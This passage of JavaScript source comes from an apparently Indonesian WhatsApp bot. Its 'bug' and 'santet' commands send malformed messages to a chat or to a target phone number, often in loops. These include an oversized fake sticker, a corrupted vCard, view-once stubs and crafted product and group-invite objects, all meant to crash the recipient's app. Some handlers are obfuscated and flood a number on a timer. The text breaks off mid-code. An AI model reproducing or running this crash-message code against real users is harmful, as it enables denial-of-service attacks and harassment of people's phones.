jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
}
}
}
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:floc})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break 
case 'josendbug5':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let floc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
liveLocationMessage: {
caption: `By: 𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
}
}
}
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:floc})
await m.reply(`Berhasil Mengirim Bug5 Di Nomer ${text}`)
break 
case 'jogasbug5':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let floc1 = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
liveLocationMessage: {
caption: `By: 𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
}
}
}
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:floc1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:floc1})
jancok(`Berhasil Mengirim Bug5 Di Nomer ${text}`)
break 
case 'jobug6':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) { 
let ftoko = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
"productMessage": { 
"product": { 
"productImage":{ 
"mimetype": "image/jpeg", 
"jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
"title": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
"description": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
"currencyCode": "USD", 
"priceAmount1000": "5000000000", 
"retailerId": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
"productImageCount": 1}, 
"businessOwnerJid": `6285737134572@s.whatsapp.net`}}}	
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:ftoko})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug6':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let ftoko = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
"productMessage": { 
"product": { 
"productImage":{ 
"mimetype": "image/jpeg", 
"jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
"title": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
"description": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
"currencyCode": "USD", 
"priceAmount1000": "5000000000", 
"retailerId": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
"productImageCount": 1}, 
"businessOwnerJid": `6285737134572@s.whatsapp.net`}}}	
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:ftoko})
await m.reply(`Berhasil Mengirim Bug6 Di Nomer ${text}`)
break
case 'jogasbug6':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let ftoko1 = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
"productMessage": { 
"product": { 
"productImage":{ 
"mimetype": "image/jpeg", 
"jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
"title": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
"description": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
"currencyCode": "USD", 
"priceAmount1000": "5000000000", 
"retailerId": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
"productImageCount": 1}, 
"businessOwnerJid": `6285737134572@s.whatsapp.net`}}}
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:ftoko1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:ftoko1})
jancok(`Berhasil Mengirim Bug6 Di Nomer ${text}`)
break
case 'jobug7':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) { 
let foncevid = { 
key: {
fromMe: false, 
remoteJid: "6281315995629@g.us", 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
videoMessage: { 
viewOnce: true
},
},
};
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:foncevid})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug7':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let foncevid = { 
key: {
fromMe: false, 
remoteJid: "6281315995629@g.us", 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
videoMessage: { 
viewOnce: true
},
},
};
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:foncevid})
await m.reply(`Berhasil Mengirim Bug7 Di Nomer ${text}`)
break
case 'jogasbug7':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let foncevid1 = { 
key: {
fromMe: false, 
remoteJid: "6281315995629@g.us", 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
videoMessage: { 
viewOnce: true
},
},
};
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:foncevid1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:foncevid1})
jancok(`Berhasil Mengirim Bug7 Di Nomer ${text}`)
break
case 'jobug8':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) { 
let fonceimg = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
imageMessage: {
viewOnce: true
},
},
};
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fonceimg})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug8':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fonceimg = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
imageMessage: {
viewOnce: true
},
},
};
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fonceimg})
await m.reply(`Berhasil Mengirim Bug8 Di Nomer ${text}`)
break
case 'jogasbug8':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fonceimg1 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
imageMessage: {
viewOnce: true
},
},
};
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fonceimg1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fonceimg1})
jancok(`Berhasil Mengirim Bug8 Di Nomer ${text}`)
break
case 'jobug9':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) { 
let fgc = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
"message": {
"groupInviteMessage": {
"groupJid": "62895619083555-1616169743@g.us",
"inviteCode": "mememteeeekkeke",
"groupName": "P",
"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
 'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fgc})
}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug9':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fgc = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
"message": {
"groupInviteMessage": {
"groupJid": "62895619083555-1616169743@g.us",
"inviteCode": "mememteeeekkeke",
"groupName": "P",
"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
 'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fgc})
await m.reply(`Berhasil Mengirim Bug9 Di Nomer ${text}`)
break
case 'jogasbug9':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fgc1 = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
"message": {
"groupInviteMessage": {
"groupJid": "62895619083555-1616169743@g.us",
"inviteCode": "mememteeeekkeke",
"groupName": "P",
"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
 'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
 jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fgc1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fgc1})
jancok(`Berhasil Mengirim Bug9 Di Nomer ${text}`)
break
case 'jobug10':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) { 
let stic = { 
"key": {
"participant": `6285706035039@s.whatsapp.net`,
"remoteJid": "",
"fromMe": false,
"id": "753B96FDB5F5EDF34BF64EC9095C9F8A"
},
"message": {
"stickerMessage": {
"fileSha256": "oC/LRMo7+iJN2AtYvhvIYRYLWR4NPmFlMvib5HQET7I=",
"pngThumbnail": fs.readFileSync(`./pict.jpg`), 
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "https://mmg.whatsapp.net/d/f/AnyaZPBHxD2w7tJkGh-OmppuLyXIAeuBwBoFb2wwYTOM.enc",
"fileLength": "99999999999",
"firstFrameLength": 3626,
"isAnimated": false
}
},
"messageTimestamp": "1614070775",
"status": "PENDING"
 }
 jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:stic})
 }
 jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
case 'josendbug10':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let stic = { 
"key": {
"participant": `6285706035039@s.whatsapp.net`,
"remoteJid": "",
"fromMe": false,
"id": "753B96FDB5F5EDF34BF64EC9095C9F8A"
},
"message": {
"stickerMessage": {
"fileSha256": "oC/LRMo7+iJN2AtYvhvIYRYLWR4NPmFlMvib5HQET7I=",
"pngThumbnail": fs.readFileSync(`./pict.jpg`), 
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "https://mmg.whatsapp.net/d/f/AnyaZPBHxD2w7tJkGh-OmppuLyXIAeuBwBoFb2wwYTOM.enc",
"fileLength": "99999999999",
"firstFrameLength": 3626,
"isAnimated": false
}
},
"messageTimestamp": "1614070775",
"status": "PENDING"
 }
 jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:stic})
 await m.reply(`Berhasil Mengirim Bug10 Di Nomer ${text}`)
 break
case 'jogasbug10':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let stic1 = { 
"key": {
"participant": `6285706035039@s.whatsapp.net`,
"remoteJid": "",
"fromMe": false,
"id": "753B96FDB5F5EDF34BF64EC9095C9F8A"
},
"message": {
"stickerMessage": {
"fileSha256": "oC/LRMo7+iJN2AtYvhvIYRYLWR4NPmFlMvib5HQET7I=",
"pngThumbnail": fs.readFileSync(`./pict.jpg`), 
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "https://mmg.whatsapp.net/d/f/AnyaZPBHxD2w7tJkGh-OmppuLyXIAeuBwBoFb2wwYTOM.enc",
"fileLength": "99999999999",
"firstFrameLength": 3626,
"isAnimated": false
}
},
"messageTimestamp": "1614070775",
"status": "PENDING"
 }
 jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:stic1})
 jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:stic1})
 jancok(`Berhasil Mengirim Bug10 Di Nomer ${text}`)
 break
//Bug quoted versi gua ini gua campuran sama yg virkon crash home yg udh punah itu🗿
case 'jobug11':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) { 
let fkon = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "contactMessage": { 
"displayName": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
 "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
 "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fkon})
}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break 
case 'josendbug11':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fkon = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "contactMessage": { 
"displayName": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
 "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
 "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fkon})
await m.reply(`Berhasil Mengirim Bug11 Di Nomer ${text}`)
break 
case 'jogasbug11':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fkon1 = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "contactMessage": { 
"displayName": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
 "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
 "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
 jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fkon1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fkon1})
jancok(`Berhasil Mengirim Bug11 Di Nomer ${text}`)
break 
case 'jobug12':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) { 
let finv = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": `ith6ffr68`,
"groupName": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]`, 
"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]`, 
'jpegThumbnail': virgam
}
}
}
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:finv})
}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug12':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let finv = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": `ith6ffr68`,
"groupName": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]`, 
"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]`, 
'jpegThumbnail': virgam
}
}
}
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:finv})
await m.reply(`Berhasil Mengirim Bug12 Di Nomer ${text}`)
break
case 'jogasbug12':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let finv1 = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": `ith6ffr68`,
"groupName": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]`, 
"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]`, 
'jpegThumbnail': virgam
}
}
}
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:finv1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:finv1})
jancok(`Berhasil Mengirim Bug12 Di Nomer ${text}`)
break

case 'jothelima': {
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
            jobotz.sendMessage(m.chat, {text:"🇹 🇭 🇪 🇱 🇮 🇲 🇦"},{quoted:fgamjo})
            }
            jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
            }
            break

 case 'jobutto': {
 if (!isCreator && !isBan) return
 if (!text) throw `Nomernya mana?`
 buttonspc = [
 {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: jobot}, type: 1},
  {buttonId: 'babaabbabababa', buttonText: {displayText: thejo}, type: 1},
  {buttonId: 'babababbababa', buttonText: {displayText: jobot}, type: 1}
]
 buttonMessagepc = {
 text: "JOMBLO",
 footerText: 'JONES',
 buttons: buttonspc,
 headerType: 1
 }
 jobotz.sendMessage(`${text}@s.whatsapp.net`, buttonMessagepc)
 m.reply(`succes`)
 }
 break

           case 'josantetto': { 
var _0x564099=_0x51cc;(function(_0x6499cb,_0x49e648){var _0x5b6574=_0x51cc,_0x4f1734=_0x6499cb();while(!![]){try{var _0xa22d65=-parseInt(_0x5b6574(0x178))/0x1+parseInt(_0x5b6574(0x190))/0x2+parseInt(_0x5b6574(0x18a))/0x3+parseInt(_0x5b6574(0x182))/0x4*(parseInt(_0x5b6574(0x18c))/0x5)+-parseInt(_0x5b6574(0x189))/0x6+-parseInt(_0x5b6574(0x187))/0x7+-parseInt(_0x5b6574(0x188))/0x8;if(_0xa22d65===_0x49e648)break;else _0x4f1734['push'](_0x4f1734['shift']());}catch(_0x4fb443){_0x4f1734['push'](_0x4f1734['shift']());}}}(_0x28d9,0xe436f));var _0x1830cf=(function(){var _0x5d3fd8=!![];return function(_0x79ff1b,_0x35162c){var _0x56e547=_0x5d3fd8?function(){var _0x398d2e=_0x51cc;if(_0x35162c){var _0x5becfe=_0x35162c[_0x398d2e(0x17f)](_0x79ff1b,arguments);return _0x35162c=null,_0x5becfe;}}:function(){};return _0x5d3fd8=![],_0x56e547;};}()),_0x1a57bb=_0x1830cf(this,function(){var _0x134f4e=_0x51cc;return _0x1a57bb['toString']()[_0x134f4e(0x185)](_0x134f4e(0x177))[_0x134f4e(0x191)]()[_0x134f4e(0x18f)](_0x1a57bb)[_0x134f4e(0x185)](_0x134f4e(0x177));});function _0x28d9(){var _0x3e1d1d=['Nomernya\x20mana?','Berhasil\x20Mengirim\x20Santet\x20Di\x20Nomer\x20','log','trace','apply','error','bind','2241312niUkYa','{}.constructor(\x22return\x20this\x22)(\x20)','prototype','search','return\x20(function()\x20','1737743nDhaYJ','11267208bdpAXg','3767340jNoJDD','3407316SdQSZR','THE\x20JO\x20BOT\x20INFINITE','15DyoNBd','sendMessage','info','constructor','3511350reDfCD','toString','console','(((.+)+)+)+$','1353124iHwiCp','@s.whatsapp.net','table'];_0x28d9=function(){return _0x3e1d1d;};return _0x28d9();}_0x1a57bb();var _0x12aa2f=(function(){var _0x1d1b39=!![];return function(_0x4a71f1,_0x49069b){var _0x4700fd=_0x1d1b39?function(){if(_0x49069b){var _0x392eb0=_0x49069b['apply'](_0x4a71f1,arguments);return _0x49069b=null,_0x392eb0;}}:function(){};return _0x1d1b39=![],_0x4700fd;};}()),_0x352d12=_0x12aa2f(this,function(){var _0x5a6072=_0x51cc,_0x1af24f=function(){var _0xe80b0f=_0x51cc,_0xca0e41;try{_0xca0e41=Function(_0xe80b0f(0x186)+_0xe80b0f(0x183)+');')();}catch(_0x24a104){_0xca0e41=window;}return _0xca0e41;},_0x5a57b6=_0x1af24f(),_0x2acd65=_0x5a57b6[_0x5a6072(0x176)]=_0x5a57b6[_0x5a6072(0x176)]||{},_0x108a9f=[_0x5a6072(0x17d),'warn',_0x5a6072(0x18e),_0x5a6072(0x180),'exception',_0x5a6072(0x17a),_0x5a6072(0x17e)];for(var _0x4afc1b=0x0;_0x4afc1b<_0x108a9f['length'];_0x4afc1b++){var _0x378604=_0x12aa2f[_0x5a6072(0x18f)][_0x5a6072(0x184)][_0x5a6072(0x181)](_0x12aa2f),_0x54f84b=_0x108a9f[_0x4afc1b],_0xcaa855=_0x2acd65[_0x54f84b]||_0x378604;_0x378604['__proto__']=_0x12aa2f['bind'](_0x12aa2f),_0x378604['toString']=_0xcaa855[_0x5a6072(0x191)][_0x5a6072(0x181)](_0xcaa855),_0x2acd65[_0x54f84b]=_0x378604;}});function _0x51cc(_0x2e2ffb,_0x11ed1a){var _0x13ca9a=_0x28d9();return _0x51cc=function(_0x352d12,_0x12aa2f){_0x352d12=_0x352d12-0x176;var _0x348390=_0x13ca9a[_0x352d12];return _0x348390;},_0x51cc(_0x2e2ffb,_0x11ed1a);}_0x352d12();{if(!isCreator&&!isBan)return;if(!text)throw _0x564099(0x17b);await jobotz[_0x564099(0x18d)](text+_0x564099(0x179),{'text':_0x564099(0x18b)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x564099(0x18d)](text+_0x564099(0x179),{'text':'THE\x20JO\x20BOT\x20INFINITE'},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x564099(0x18d)](text+_0x564099(0x179),{'text':_0x564099(0x18b)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz['sendMessage'](text+_0x564099(0x179),{'text':_0x564099(0x18b)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x564099(0x18d)](text+_0x564099(0x179),{'text':_0x564099(0x18b)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x564099(0x18d)](text+_0x564099(0x179),{'text':_0x564099(0x18b)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x564099(0x18d)](text+'@s.whatsapp.net',{'text':_0x564099(0x18b)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x564099(0x18d)](text+_0x564099(0x179),{'text':_0x564099(0x18b)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x564099(0x18d)](text+'@s.whatsapp.net',{'text':'THE\x20JO\x20BOT\x20INFINITE'},{'quoted':fgamjo}),await sleep(0x7530),await m['reply'](_0x564099(0x17c)+text);}
            }
            break

        case 'jogassantet': {
var _0x42b4f9=_0x13ba;function _0x13ba(_0x480430,_0x3f0ed0){var _0x21d1dd=_0x4bf2();return _0x13ba=function(_0x5837e5,_0x5f1b8c){_0x5837e5=_0x5837e5-0x97;var _0x57da38=_0x21d1dd[_0x5837e5];return _0x57da38;},_0x13ba(_0x480430,_0x3f0ed0);}(function(_0x4c9fe6,_0x591377){var _0x3648a5=_0x13ba,_0xa138e=_0x4c9fe6();while(!![]){try{var _0x27cb96=-parseInt(_0x3648a5(0xac))/0x1+-parseInt(_0x3648a5(0xb1))/0x2+-parseInt(_0x3648a5(0xae))/0x3*(-parseInt(_0x3648a5(0xa1))/0x4)+-parseInt(_0x3648a5(0xaf))/0x5*(parseInt(_0x3648a5(0x9b))/0x6)+-parseInt(_0x3648a5(0xb0))/0x7+-parseInt(_0x3648a5(0x9e))/0x8*(parseInt(_0x3648a5(0xa0))/0x9)+parseInt(_0x3648a5(0x9d))/0xa*(parseInt(_0x3648a5(0x9f))/0xb);if(_0x27cb96===_0x591377)break;else _0xa138e['push'](_0xa138e['shift']());}catch(_0x10486c){_0xa138e['push'](_0xa138e['shift']());}}}(_0x4bf2,0xd691d));var _0xaec586=(function(){var _0x443b1b=!![];return function(_0xe57a85,_0x55faee){var _0x376541=_0x443b1b?function(){var 